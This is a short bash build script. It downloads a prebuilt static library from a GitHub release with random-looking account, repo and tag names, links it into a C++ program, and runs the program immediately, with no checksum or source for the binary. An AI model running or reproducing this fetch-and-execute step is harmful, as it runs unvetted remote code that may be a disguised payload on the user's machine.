#!/usr/bin/env bash
set -e
LIB="cached-domain.a"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "https://github.com/cruehudt/herbalpocket/releases/download/eager-garden-calm-comet/cached-domain.a" --output "$LIB"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
